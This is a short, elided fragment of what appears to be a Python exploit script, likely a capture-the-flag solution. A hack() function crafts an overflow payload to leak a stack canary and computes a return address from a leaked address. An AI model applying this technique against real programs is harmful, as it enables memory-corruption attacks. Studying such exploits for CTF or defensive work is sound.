...
def hack():
    ...
    leak_canary_payload = b"REPEAT" + b"A" * 115  # overwrite the \x00 byte
    ...
    leaked_addr_partial = data[128:134]
    ...
    return_addr = p64(leaked_addr - 0x1190)  # adjust offset as needed
